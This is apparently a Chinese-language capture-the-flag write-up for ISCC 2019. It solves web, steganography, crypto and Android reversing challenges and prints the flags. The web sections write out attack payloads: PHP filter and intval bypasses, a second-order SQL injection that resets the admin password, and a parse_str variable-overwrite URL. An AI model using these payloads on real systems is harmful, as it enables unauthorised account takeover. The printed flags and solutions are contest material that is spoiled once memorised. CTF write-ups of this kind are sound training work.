# web1
使用`chr(256+i)=chr(i)`绕过`$value[$i] > 32 && $value[$i] < 127`
使用科学计数法绕过`intval($password) < 2333 && intval($password + 1) > 2333`：

```bash
λ php -r "echo intval('2e5');"
2
λ php -r "echo '2e5'+1;"
200001
λ php -r "echo intval('2e5'+1);"
200001
```

写exp得到payload：

```python
s='w3lc0me_To_ISCC2019'
value="?"
for idx in range(len(s)):
    value+="value[{idx}]={value}&".format(idx=idx, value=256+ord(s[idx]))
value+="password=2e5"
print(value)
```

# web2

涉及到一个简单的验证码识别，可以用PkavHTTPFuzzer搞定，也可以自己用Tesseract写或者用Burp [reCAPTCHA](https://github.com/bit4woo/reCAPTCHA)(其实不怎么推荐用Burp这个插件，因为其没法做)。

![1556785947674](writeup/1556785947674.png)

# web3

二次注入，详细看Sqli-lab24<https://www.freebuf.com/articles/web/167089.html>

先用`admin'#anemone`注册账号，账号名被转义，但是保存在数据库时转义符会消失：

![1557285381714](writeup/1557285381714.png)

接着登录后修改密码，此时数据库执行语句为：

```sql
UPDATE users 
SET PASSWORD='xxx' where username='admin'#anemone and password='real_password'
```



# web4

`parse_str()`存在变量覆盖，payload如下：

```url
http://39.100.83.188:8066/?action=auth&key=anemone&hashed_key=2d557c961d57999ffda3856b207df26d2f547a69d5fa8e8021555094d4744ec0
```



# 隐藏的信息

读取文件，8进制转为char，拼成字符串，base64decode得到flag：

```python
with open('./message.txt', 'r') as f:
    text=f.readline()
arr=text.split()
s=""
for e in arr:
    s+=chr(int(e,8))
print(base64.b64decode(s))
```

# 倒立屋

图片LSB提取头部看到IsCc_2019字符串，倒过来写就是flag

![1556933460427](writeup/1556933460427.png)

# Keyes' secret 

键盘键位的图案对应char，注意大写、空格和顺序，脚本需要用Python3运行

```python
keyboard2char={
    "MNBVCDRTGHU":"r",
    "EFVGYWDCFT":"w",
    "NBVCXSWERF":"p",
    "QAZXCDEWV":"q",
    "XSWEFTYHN":"m",
    "TGBNMJUY":"o",
    "ZAQWDVFR":"n",
    "RFVGYHN":"h",
    "TYUIOJM":"t",
    "TGBNMJU":"u",
    "IUYHNBV":"s",
    "GRDXCVB":"a",
    "WSXCFE":"d",
    "CVGRED":"g",
    "YHNMKJ":"b",
    "QAZSCE":"k",
    "WSXCDE":"e",
    "QWERTY":" ",
    "RGNYGC":"x",
    "WSXCV":"l",
    "TRFVG":"f",
    "TRFVB":'c',
    "EFVGY":"v",
    "EFVT":"y",
    "WSX":"i",
}
with open("./keyes.txt", 'r') as f:
    s=f.readline()

for k,v in keyboard2char.items():
    s=s.replace(k,v)

print(s.upper())
```

# Aesop's secret

图片尾部有aes密文

![1556871691247](writeup/1556871691247.png)

```
U2FsdGVkX19QwGkcgD0fTjZxgijRzQOGbCWALh4sRDec2w6xsY/ux53Vuj/AMZBDJ87qyZL5kAf1fmAH4Oe13Iu435bfRBuZgHpnRjTBn5+xsDHONiR3t0+Oa8yG/tOKJMNUauedvMyN4v4QKiFunw==
```

将gif拼接可以得到密钥ISCC：

![combine](writeup/combine.bmp)

使用在线工具可以解密：

<http://tool.chinaz.com/Tools/textencrypt.aspx>

# 碎纸机

使用binwalk分解图片，得到puzzle1-10.jpg，共十张jpg，每张jpg末尾存在1250字节数据。

将数据作为灰度值，做成50*25大小的10张图片，得到Flag={ISCC_is_so_interesting_!}，提取代码如下：

```python
#!/usr/bin/env python
# coding=utf-8

# @file solve.py
# @brief solve
# @author Anemone95,x565178035@126.com
# @version 1.0
# @date 2019-05-04 09:55

import numpy as np
import matplotlib.pyplot as plt
from scipy import misc

def extract(filename):
    with open(filename, 'rb') as f:
        content=f.read()

    return content[-1250:]

def solve():
    contents=[]
    for i in range(1,11):
        contents.append(extract('./extracted/puzzle{}.jpg'.format(i)))

    for i in range(10):
        showpng(contents[i],50,"puzzle{}".format(i+1))

def showpng(content, xx, name):
    yy, xx, depth = 1250//xx, xx, 8
    new=[]
    for y in range(yy):
        tmp=[]
        for x in range(xx):
            rgb=content[y*xx+x]
            print(y*xx+x)
            tmp.append([rgb, rgb, rgb])
        new.append(tmp)
    # new[y][x][rgb]
    lena=np.array(new)    #生成np.array
    misc.imsave('{}.png'.format(name), lena)    #保存图片

if __name__ == '__main__':
    solve()
```

# answer to everything

将#后面的字符sha1得到flag

![1556882481868](writeup/1556882481868.png)

# 他们能在一起吗

下载图片二维码，binwalk分离出加密的zip

读取图片得到base64：`UEFTUyU3QjBLX0lfTDBWM19ZMHUlMjElN0Q=`， 解码得到`PASS%7B0K_I_L0V3_Y0u%21%7D`再解码得到压缩包密码PASS{0K_I_L0V3_Y0u!}

用密码`0K_I_L0V3_Y0u!`解压得到flag：ISCC{S0rrY_W3_4R3_Ju5T_Fr1END}



# 无法运行的exe

将exe下载下来，用脚本将base64内容解码为图片。
修改图片第八个字节为0A打开得到二维码，扫描得到flag：IScC_2019

# Mobile01

len(key)=16,  49≤key中每个字符≤56

![1557559916349](writeup/1557559916349.png)

分析so层，需要通过checkfirst和checkAgain

![1557648427250](writeup/1557648427250.png)

checkfirst检测前8个数字是否为递增，前面的两个if-else为编译器优化

![1557662036708](writeup/1557662036708.png)

checkAgain：

![1557661462368](writeup/1557661462368.png)

相当于

```python
for i in range(0,8):
    strbuf[4*i]=buf[i]-49
```

![1557667292962](writeup/1557667292962.png)

这段反编译就不太好使了，动态调试可以看到是：

```python
idx0m1=buf[0]-'1'
idx7m1=buf[7]-'1'
idx1m1=buf[1]-'1'
idx6m1=buf[0]-'1'
```

接下来根据反编译的逻辑写脚本爆破就好了

![1557667739793](writeup/1557667739793.png)